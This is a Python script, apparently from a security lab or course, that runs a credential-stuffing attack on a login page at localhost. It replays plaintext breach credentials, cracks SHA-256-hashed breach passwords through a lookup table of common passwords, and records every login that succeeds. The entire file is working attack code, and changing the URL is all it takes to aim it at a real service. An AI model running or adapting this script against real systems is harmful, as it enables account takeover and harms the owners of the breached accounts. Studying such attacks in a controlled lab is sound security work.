from csv import reader
from requests import post, codes
from app.util.hash import hash_sha256

LOGIN_URL = "http://localhost:8080/login"

PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"

def load_common_pwd(file):
    with open(file) as f:
        r = reader(f, delimiter= ' ')
        header = next(r)
        assert(header[0] == 'password')
        return list(r)

def create_look_up_table(file):
    passwords = load_common_pwd(file)
    d = {}

    for pwd in passwords:
        d[hash_sha256(pwd[0])] = pwd[0]
    return d

def credential_stuffing_with_hash(creds):
    table = create_look_up_table('common_passwords.txt')
    success = []
    for username, hashed in creds:
        pwd = table[hashed]
        if attempt_login(username, pwd) is True:
            print(username, pwd)
            success.append(username + ' '+ pwd)
    return success

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def attempt_login(username, password):
    response = post(LOGIN_URL,
                    data={
                        "username": username,
                        "password": password,
                        "login": "Login",
                    })
    return response.status_code == codes.ok

def credential_stuffing_attack(creds):

    success = []
    for name, cred in creds:
        if attempt_login(name, cred) is True:
            print(name, cred)
            success.append(name + " "+ cred)
    return success

def main():
    creds = load_breach(PLAINTEXT_BREACH_PATH)
    credential_stuffing_attack(creds)
    fileName = 'app/scripts/breaches/hashed_breach.csv'
    hashed_creds = load_breach(fileName)
    credential_stuffing_with_hash(hashed_creds)

if __name__ == "__main__":
    main()